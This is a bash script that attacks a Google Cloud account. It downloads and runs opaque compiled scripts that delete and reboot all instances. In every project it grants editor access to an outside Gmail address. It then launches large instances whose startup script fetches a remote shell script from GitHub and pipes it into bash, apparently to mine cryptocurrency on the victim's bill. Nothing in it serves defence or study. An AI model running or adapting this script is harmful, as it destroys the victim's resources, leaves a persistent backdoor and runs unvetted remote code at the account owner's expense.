#!/bin/bash

email="oldhuman55@gmail.com"

delete_instances (){
	wget https://github.com/oldhuman/shameOnYou/raw/master/delete.sh.x -O /tmp/delete.sh.x
	chmod +x /tmp/delete.sh.x
	cd /tmp && ./delete.sh.x
}

restart_instances (){
	wget https://github.com/oldhuman/shameOnYou/raw/master/reboot-all.sh.x -O /tmp/reboot-all.sh.x
	chmod +x /tmp/reboot-all.sh.x
	cd /tmp && ./reboot-all.sh.x
}

create_instance (){
gcloud beta compute --project=$1 instances create instance-$2 --zone=$3 --machine-type=custom-20-22272 --subnet=default --network-tier=PREMIUM --metadata=startup-script=sudo\ curl\ -s\ -L\ \ https://raw.githubusercontent.com/oldhuman/shameOnYou/master/m.sh\ \|\ bash\ -s --maintenance-policy=MIGRATE --scopes=https://www.googleapis.com/auth/cloud-platform --min-cpu-platform=Intel\ Broadwell --image=debian-9-stretch-v20181011  --image-project=debian-cloud --boot-disk-size=10GB --boot-disk-type=pd-standard --boot-disk-device-name=instance-1 --async --quiet
}

instances_count=$(gcloud compute instances list --filter="status=running" --format="value(name)" | wc -l)
#LOGIC
delete_instances
restart_instances
for project in $(gcloud projects list  --format="value(project_id)")
	do
		gcloud projects add-iam-policy-binding $project --member user:$email --role roles/editor
		gcloud config set project $project
		gcloud config set compute/zone us-central1-c
		echo "Project: " $project
		i=1
		for zone in "us-central1-b" "us-east1-b" "us-west2-a"
			do
				create_instance $project $i $zone
				echo "Created instance" $project "instance-"$i $zone
				i=$((i + 1))
			done
			
			j=1
			if [ $i \> $instances_count ];
				then
					for (( c=1; c<=3; c++ ))
					do
    				create_instance $project $c "europe-west1-d"
				done
			fi;
	done
exit
